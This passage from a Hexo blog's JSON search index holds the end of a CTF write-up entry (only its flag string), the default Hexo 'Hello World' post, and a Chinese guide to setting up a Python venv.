1SICTF{f2a09bf-7f4a-4269-93a5-c8a48360b03c}","link":"/2023/09/18/sictf2023r2/"},{"title":"Hello World","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","link":"/2023/09/18/hello-world/"},{"title":"python3-venv虚拟环境使用-解决包管理版本控制混乱的问题","text":"安装1sudo apt install python3-venv 创建虚拟环境1python3 -m venv test_env 会自动在用户目录创建一个test _env的虚拟环境目录 开启&amp;使用虚拟环境1source ~/test_env/bin/activate 开启虚拟环境后pip install安装的包会自动存放在/test_env/lib/pythonx.x/site-packages目录下面 关闭虚拟环境1deactivate","link":"/2023/09/18/python3-venv%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E4%BD%BF%E7%94%A8-%E8%A7%A3%E5%86%B3%E5%8C%85%E7%AE%A1%E7%90%86%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6%E6%B7%B7%E4%B9%B1%E7%9A%84%E9%97%AE%E9%A2%98/"}],"tags":[{"name":"ctf writeup","slug":"ctf-writeup","link":"/tags/ctf-writeup/"}],"categories":[]}